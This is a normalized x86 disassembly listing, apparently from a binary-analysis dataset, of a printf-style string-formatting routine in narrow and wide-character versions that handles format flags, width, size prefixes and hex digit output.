cmp [ esi + 0x1 ] 0x34
jne r-xdata
mov [ ebp - 0x9 ] 0x0
xor ecx ecx
jmp r-xdata
test edi 0x100
je r-xdata
test edi 0x10
je r-xdata
add [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x1c ]
mov edx [ eax - 0x8 ]
mov [ ebp - 0x28 ] edx
mov edx [ eax - 0x4 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
test edi 0x8
je r-xdata
or edi 0x10
add [ ebp + 0x1c ] 0x4
mov ecx [ ebp + 0x1c ]
lea edx [ ebp - 0xb8 ]
mov al [ ecx - 0x4 ]
xor ecx ecx
mov [ ebp - 0xb8 ] al
mov [ ebp - 0xb7 ] 0x0
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x40 ] 0x1
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov ecx [ ebp + 0x1c ]
lea edx [ ebp - 0xb8 ]
mov ax [ ecx - 0x4 ]
mov [ ebp - 0xb8 ] ax
mov [ ebp - 0xb6 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x40 ] 0x1
jmp r-xdata
or edi 0x10
add [ ebp + 0x1c ] 0x4
mov ecx [ ebp + 0x1c ]
xor edx edx
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
mov edx [ eax - 0x4 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] 0x1
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax 0x6
mov eax 0x8
jmp r-xdata
test edi 0x200
je r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4c4 ]
mov [ eax ] edx
jmp r-xdata
mov [ ebp - 0x9 ] bl
jmp r-xdata
or edi 0x8
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x30 ]
neg eax
mov [ ebp - 0x4 ] eax
or edi 0x2
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx edx
lea edx [ edx + edx * 4 ]
movsx ecx bl
add edx ecx
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx edx
lea edx [ edx + edx * 4 ]
movsx ecx bl
add edx ecx
mov [ ebp - 0x4 ] edx
jmp r-xdata
movsx ecx bl
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax 0x5
jmp r-xdata
or edi 0x10
cmp [ esi ] 0x31
jne r-xdata
cmp [ esi + 0x1 ] 0x32
jne r-xdata
mov ecx edi
add esi 0x2
or ecx 0x100
mov eax 0x5
and ecx 0xfffffdef
mov edi ecx
jmp r-xdata
test edi 0x200
je r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cl cl
mov edx [ eax - 0x4 ]
mov [ ebp - 0x2c ] edx
je r-xdata
lea eax [ ebp - 0xb7 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x2d
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov edx edi
and edx 0x5
cmp edx 0x5
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x18 ] rw-data
mov [ ebp - 0x18 ] rw-data
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax 0x6
jmp r-xdata
mov edx edi
push eax
and dl 0x1
lea ecx [ ebp - 0xb7 ]
push edx
push ebx
mov [ ebp - 0x18 ] ecx
push ecx
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4c4 ]
mov [ edx ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov ax [ ebp - 0x4c4 ]
mov [ ecx ] ax
jmp r-xdata
mov eax 0x3
jmp r-xdata
cmp [ esi ] 0x38
jne r-xdata
cmp [ esi + 0x1 ] 0x36
jne r-xdata
add esi 0x2
mov eax edi
or eax 0x10
and eax 0xfffffcff
mov edi eax
mov eax 0x5
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cl cl
mov edx [ eax - 0x4 ]
mov [ ebp - 0x30 ] edx
je r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cl cl
mov dx [ eax - 0x4 ]
mov [ ebp - 0x32 ] dx
je r-xdata
mov eax [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp - 0x2c ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
or edi 0x4
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x2d
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
push edx
call sub_4c4e7c
pop ecx
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x2d
jne r-xdata
mov eax [ ebp - 0x10 ]
add [ ebp - 0x40 ] eax
test edi 0x2
jne r-xdata
cmp bl 0x6f
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push eax
mov edx [ ebp + 0x1c ]
push edx
call j_sub_4ccc3c
add esp 0x18
mov ecx edi
and ecx 0x100
push ecx
mov eax [ ebp + 0x1c ]
push eax
call j_sub_4ccc3c#2
add esp 0x8
mov [ ebp + 0x1c ] eax
inc esi
and edi 0xfffffcef
mov eax 0x5
jmp r-xdata
mov edx edi
add esi 0x2
or edx 0x200
mov eax 0x5
and edx 0xfffffeef
mov edi edx
jmp r-xdata
mov eax [ ebp - 0x30 ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x30 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
movzx eax [ ebp - 0x32 ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax [ ebp - 0x32 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
push edx
call sub_4c4e7c
pop ecx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] eax
mov edx [ ebp - 0x18 ]
cmp [ edx ] 0x2d
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
dec [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
mov cl [ ebp - 0x9 ]
mov [ edx ] cl
mov eax [ ebp - 0x18 ]
push eax
call sub_4c4e7c
pop ecx
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x40 ]
jle r-xdata
dec [ ebp - 0x40 ]
test edi 0x40
je r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x40 ]
jle r-xdata
cmp bl 0x78
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jg r-xdata
mov eax 0x7fffffff
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax 0x7fffffff
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
dec [ ebp - 0x3c ]
jmp r-xdata
mov al [ ebp - 0x1d ]
push eax
push ecx
mov edx [ ebp - 0x38 ]
push edx
mov ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call sub_4ccd38
add esp 0x18
mov edx [ ebp - 0x18 ]
mov [ edx ] 0x0
jmp r-xdata
dec [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x40 ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea edx [ ebp - 0x520 ]
push edx
push 0x30
call sub_4c89a8
add esp 0x8
lea ecx [ ebp - 0x520 ]
push ecx
push ebx
call sub_4c89a8
add esp 0x8
lea ecx [ ebp - 0x520 ]
push ecx
push 0x20
call sub_4c89a8
add esp 0x8
dec [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x40 ]
jg r-xdata
or edi 0x40
sub [ ebp - 0x4 ] 0x2
sub [ ebp - 0x10 ] 0x2
jns r-xdata
cmp bl 0x58
jne r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov [ ebp - 0x40 ] ecx
jmp r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov [ ebp - 0x40 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x3c ]
jle r-xdata
inc [ ebp - 0x40 ]
dec [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
mov al [ ebp - 0x9 ]
mov [ ecx ] al
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
sub [ ebp - 0x40 ] eax
mov edx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x2d
je r-xdata
xor ecx ecx
mov [ ebp - 0x10 ] ecx
cmp [ edx ] 0x0
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x3c ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x4c ] ecx
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x54 ] eax
jmp r-xdata
lea ecx [ ebp - 0x520 ]
push ecx
mov eax [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
mov dl [ eax ]
push edx
call sub_4c89a8
add esp 0x8
dec [ ebp - 0x40 ]
dec [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x20
je r-xdata
dec eax
inc [ ebp - 0x40 ]
inc edx
jmp r-xdata
dec eax
inc [ ebp - 0x40 ]
add edx 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
add [ ebp - 0x4 ] 0xffffffff
test eax eax
jg r-xdata
mov eax [ ebp - 0x40 ]
sub [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x54 ]
add [ ebp - 0x54 ] 0xffffffff
test eax eax
jg r-xdata
mov eax [ ebp - 0x10 ]
add [ ebp - 0x10 ] 0xffffffff
test eax eax
jne r-xdata
mov edx [ ebp - 0x18 ]
cmp [ edx ] 0x2b
jne r-xdata
lea ecx [ ebp - 0x520 ]
push ecx
push 0x20
call sub_4c89a8
add esp 0x8
jmp r-xdata
mov edx [ ebp - 0x40 ]
add [ ebp - 0x40 ] 0xffffffff
test edx edx
jne r-xdata
mov edx [ ebp - 0x44 ]
add [ ebp - 0x44 ] 0x2
mov cx [ edx ]
push ecx
lea eax [ ebp - 0x56 ]
push eax
call sub_4cc2fc
add esp 0x8
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
jle r-xdata
lea edx [ ebp - 0x4b8 ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0x40 ] ecx
lea ecx [ ebp - 0x520 ]
push ecx
push 0x30
call sub_4c89a8
add esp 0x8
lea edx [ ebp - 0x520 ]
push edx
mov ecx [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
mov al [ ecx ]
push eax
call sub_4c89a8
add esp 0x8
jmp r-xdata
mov edx [ ebp - 0x4c ]
xor ecx ecx
cmp ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x56 ]
lea edx [ ebp + edx - 0x4b8 ]
jge r-xdata
mov bl [ eax ]
inc eax
mov [ edx ] bl
inc edx
inc [ ebp - 0x4c ]
inc ecx
cmp ecx [ ebp - 0x50 ]
jl r-xdata
sub_4c938c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax 0x1
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov edx [ ebx + 0xb4 ]
test edx edx
je r-xdata
push eax
mov edx [ ebx + 0xa8 ]
push edx
mov ecx [ ebx + 0xa0 ]
push ecx
push ebx
call [ ebx + 0xa4 ]
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ edx ]
cmp ecx [ ebx + 0xac ]
ja r-xdata
xor eax eax
mov [ ebx + 0xa0 ] eax
mov [ ebx + 0xb0 ] 0x1
xor eax eax
sub_4c93ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx + 0xa0 ] 0x50
jl r-xdata
mov eax [ ebx + 0xb4 ]
test eax eax
je r-xdata
push ebx
call sub_4c938c
pop ecx
mov ecx [ ebx + 0xa0 ]
mov ax [ ebp + 0x8 ]
mov [ ebx + ecx * 2 ] ax
inc [ ebx + 0xa0 ]
mov edx [ eax ]
cmp edx [ ebx + 0xac ]
jbe r-xdata
inc [ ebx + 0xac ]
pop ebx
pop ebp
retn
sub_4c9434
push ebp
mov ebp esp
push ebx
mov ecx 0x7
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
add eax 0xe
add dx 0x37
mov [ eax ] dx
add dx 0x30
mov [ eax ] dx
jmp r-xdata
mov edx ebx
and edx 0xf
cmp edx 0xa
jge r-xdata
pop ebx
pop ebp
retn
shr ebx 0x4
dec ecx
add eax 0xfffffffe
test ecx ecx
jge r-xdata
sub_4c9470
push ebp
mov ebp esp
add esp 0xfffffa9c
xor eax eax
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4b4 ] eax
mov [ ebp - 0x4b8 ] eax
mov [ ebp - 0x4c4 ] eax
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4c0 ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4bc ] ecx
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor eax eax
lea eax [ ebp + 0x18 ]
jmp r-xdata
lea edx [ ebp - 0x564 ]
push edx
call sub_4c938c
cmp [ ebp - 0x4b4 ] 0x0
pop ecx
je r-xdata
cmp bx 0x25
jne r-xdata
mov [ ebp - 0x4b0 ] eax
mov eax [ ebp - 0x4b8 ]
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x564 ]
push eax
push ebx
call sub_4c93ec
add esp 0x8
jmp r-xdata
mov bx [ esi ]
cmp bx 0x25
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov bx [ esi ]
add esi 0x2
test bx bx
je r-xdata
lea edx [ esi - 0x2 ]
xor ecx ecx
mov [ ebp - 0x14 ] edx
xor edx edx
mov [ ebp - 0x10 ] edx
mov eax ecx
mov [ ebp - 0xa ] 0x0
or ecx 0xffffffff
mov edi 0x20
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] 0x1
add esi 0x2
jmp r-xdata
mov eax [ ebp - 0x14 ]
add [ ebp - 0x14 ] 0x2
mov ax [ eax ]
test ax ax
jne r-xdata
movzx edx bx
cmp edx 0x7f
jg r-xdata
lea ecx [ ebp - 0x564 ]
push ecx
push eax
call sub_4c93ec
add esp 0x8
mov ecx ebx
add cl 0xe0
xor edx edx
mov dl cl
xor ecx ecx
mov cl [ edx + rw-data ]
cmp ecx 0x1a
ja r-xdata
mov bx [ esi ]
add esi 0x2
cmp bx 0x20
jb r-xdata
jmp [ ecx * 4 + jump_table_4c956c ]
test eax eax
jg r-xdata
test eax eax
jg r-xdata
test eax eax
jg r-xdata
and edi 0xffffffdf
mov eax 0x5
jmp r-xdata
or edi 0x20
mov eax 0x5
jmp r-xdata
test eax eax
jg r-xdata
add [ ebp + 0x1c ] 0x4
mov edx [ ebp + 0x1c ]
cmp eax 0x2
mov ecx [ edx - 0x4 ]
mov [ ebp - 0x30 ] ecx
jge r-xdata
cmp eax 0x4
jge r-xdata
sub bx 0x30
cmp eax 0x2
jg r-xdata
test edi 0x10
jne r-xdata
mov eax edi
or eax 0x100
and eax 0xffffffef
mov edi eax
mov eax 0x5
jmp r-xdata
mov edx edi
mov eax 0x5
or edx 0x200
and edx 0xffffffef
mov edi edx
jmp r-xdata
cmp [ esi ] 0x36
jne r-xdata
mov [ ebp - 0x38 ] 0x8
jmp r-xdata
mov [ ebp - 0x38 ] 0xa
jmp r-xdata
mov [ ebp - 0x38 ] 0x10
lea ecx [ ebx + 0xffe9 ]
mov [ ebp - 0x1e ] cx
mov [ ebp - 0x38 ] 0xa
mov cx 0x1
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
lea ecx [ ebp - 0xac ]
mov edx [ eax - 0x4 ]
mov [ ebp - 0x18 ] edx
push ecx
mov eax [ ebp - 0x18 ]
push eax
call sub_4c9434
add esp 0x8
mov [ ebp - 0x9c ] 0x0
and edi 0xfffffffb
lea edx [ ebp - 0xac ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
test edi 0x210
jne r-xdata
test edi 0x200
je r-xdata
test edi 0x210
jne r-xdata
test edi 0x200
je r-xdata
test edi 0x100
je r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test edi 0x10
mov edx [ eax - 0x4 ]
mov [ ebp - 0x18 ] edx
je r-xdata
or edi 0x1
jmp r-xdata
or edi 0x2
jmp r-xdata
cmp [ ebp - 0xa ] 0x2b
je r-xdata
test edi 0x2
jne r-xdata
cmp eax 0x4
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
jge r-xdata
mov eax 0x4
inc [ ebp - 0x8 ]
jmp r-xdata
cmp eax 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0xffffffff
mov eax 0x2
jne r-xdata
mov eax edi
or eax 0x100
and eax 0xffffffef
mov edi eax
jmp r-xdata
test edi 0x100
je r-xdata
cmp [ esi ] 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
mov [ ebp - 0xa ] 0x0
xor ecx ecx
jmp r-xdata
test edi 0x100
je r-xdata
test edi 0x10
je r-xdata
add [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x1c ]
mov edx [ eax - 0x8 ]
mov [ ebp - 0x28 ] edx
mov edx [ eax - 0x4 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
test edi 0x8
je r-xdata
or edi 0x200
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
lea ecx [ ebp - 0xac ]
mov dx [ eax - 0x4 ]
mov [ ebp - 0xac ] dx
mov [ ebp - 0xaa ] 0x0
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x40 ] 0x1
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov ecx [ ebp + 0x1c ]
mov al [ ecx - 0x4 ]
lea ecx [ ebp - 0xac ]
and al 0xff
xor edx edx
mov [ ebp - 0xac ] al
mov [ ebp - 0xab ] 0x0
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x40 ] 0x1
jmp r-xdata
or edi 0x200
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
mov edx [ eax - 0x4 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] 0x1
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
xor ecx ecx
mov edx [ eax - 0x4 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax 0x6
mov eax 0x8
jmp r-xdata
test edi 0x200
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4b8 ]
mov [ ecx ] eax
jmp r-xdata
mov [ ebp - 0xa ] bx
jmp r-xdata
or edi 0x8
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x30 ]
neg eax
mov [ ebp - 0x4 ] eax
or edi 0x2
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx edx
lea edx [ edx + edx * 4 ]
movzx ecx bx
add edx ecx
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx edx
lea edx [ edx + edx * 4 ]
movzx ecx bx
add edx ecx
mov [ ebp - 0x4 ] edx
jmp r-xdata
movzx ecx bx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax 0x5
jmp r-xdata
or edi 0x10
cmp [ esi ] 0x31
jne r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
mov ecx edi
add esi 0x4
or ecx 0x100
mov eax 0x5
and ecx 0xfffffdef
mov edi ecx
jmp r-xdata
test edi 0x200
je r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cx cx
mov edx [ eax - 0x4 ]
mov [ ebp - 0x2c ] edx
je r-xdata
lea eax [ ebp - 0xaa ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x2d
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov edx edi
and edx 0x5
cmp edx 0x5
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x18 ] rw-data
mov [ ebp - 0x18 ] rw-data
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax 0x6
jmp r-xdata
mov edx edi
push eax
and dx 0x1
lea ecx [ ebp - 0xaa ]
push edx
push ebx
mov [ ebp - 0x18 ] ecx
push ecx
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4b8 ]
mov [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov cx [ ebp - 0x4b8 ]
mov [ edx ] cx
jmp r-xdata
mov eax 0x3
jmp r-xdata
cmp [ esi ] 0x38
jne r-xdata
cmp [ esi + 0x2 ] 0x36
jne r-xdata
add esi 0x4
mov eax edi
or eax 0x10
and eax 0xfffffcff
mov edi eax
mov eax 0x5
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cx cx
mov edx [ eax - 0x4 ]
mov [ ebp - 0x30 ] edx
je r-xdata
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
test cx cx
mov dx [ eax - 0x4 ]
mov [ ebp - 0x32 ] dx
je r-xdata
mov eax [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp - 0x2c ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
or edi 0x4
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x2d
je r-xdata
cmp [ ebp - 0xa ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
push edx
call sub_4c5124
pop ecx
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x2d
jne r-xdata
mov eax [ ebp - 0x10 ]
add [ ebp - 0x40 ] eax
test edi 0x2
jne r-xdata
cmp bx 0x6f
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push eax
mov edx [ ebp + 0x1c ]
push edx
call j_sub_4ccc54
add esp 0x18
mov ecx edi
and ecx 0x100
push ecx
mov eax [ ebp + 0x1c ]
push eax
call j_sub_4ccc3c#2
add esp 0x8
mov [ ebp + 0x1c ] eax
add esi 0x2
and edi 0xfffffcef
mov eax 0x5
jmp r-xdata
mov edx edi
add esi 0x4
or edx 0x200
mov eax 0x5
and edx 0xfffffeef
mov edi edx
jmp r-xdata
mov eax [ ebp - 0x30 ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x30 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
movzx eax [ ebp - 0x32 ]
xor edx edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax [ ebp - 0x32 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
push edx
call sub_4c5124
pop ecx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] eax
mov edx [ ebp - 0x18 ]
cmp [ edx ] 0x2d
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
sub [ ebp - 0x18 ] 0x2
mov edx [ ebp - 0x18 ]
mov cx [ ebp - 0xa ]
mov [ edx ] cx
mov eax [ ebp - 0x18 ]
push eax
call sub_4c5124
pop ecx
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x40 ]
jle r-xdata
dec [ ebp - 0x40 ]
test edi 0x40
je r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x40 ]
jle r-xdata
cmp bx 0x78
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jg r-xdata
mov eax 0x7fffffff
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax 0x7fffffff
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0xa ] 0x0
je r-xdata
dec [ ebp - 0x3c ]
jmp r-xdata
mov ax [ ebp - 0x1e ]
push eax
push ecx
mov edx [ ebp - 0x38 ]
push edx
mov ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call sub_4ccdec
add esp 0x18
mov edx [ ebp - 0x18 ]
mov [ edx ] 0x0
jmp r-xdata
dec [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x40 ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea edx [ ebp - 0x564 ]
push edx
push 0x30
call sub_4c93ec
add esp 0x8
lea ecx [ ebp - 0x564 ]
push ecx
push ebx
call sub_4c93ec
add esp 0x8
lea ecx [ ebp - 0x564 ]
push ecx
push 0x20
call sub_4c93ec
add esp 0x8
dec [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x40 ]
jg r-xdata
or edi 0x40
sub [ ebp - 0x4 ] 0x2
sub [ ebp - 0x10 ] 0x2
jns r-xdata
cmp bx 0x58
jne r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov [ ebp - 0x40 ] ecx
jmp r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov [ ebp - 0x40 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x3c ]
jle r-xdata
inc [ ebp - 0x40 ]
sub [ ebp - 0x18 ] 0x2
mov ecx [ ebp - 0x18 ]
mov ax [ ebp - 0xa ]
mov [ ecx ] ax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
sub [ ebp - 0x40 ] eax
mov edx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x2d
je r-xdata
xor ecx ecx
mov [ ebp - 0x10 ] ecx
cmp [ edx ] 0x0
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x3c ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov edi [ ebp - 0x18 ]
xor eax eax
mov [ ebp - 0x48 ] eax
lea ebx [ ebp - 0x4ac ]
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
lea ecx [ ebp - 0x564 ]
push ecx
mov eax [ ebp - 0x18 ]
add [ ebp - 0x18 ] 0x2
mov dx [ eax ]
push edx
call sub_4c93ec
add esp 0x8
dec [ ebp - 0x40 ]
dec [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x20
je r-xdata
dec eax
inc [ ebp - 0x40 ]
inc edx
jmp r-xdata
dec eax
inc [ ebp - 0x40 ]
add edx 0x2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jg r-xdata
mov ecx [ ebp - 0x40 ]
sub [ ebp - 0x4 ] ecx
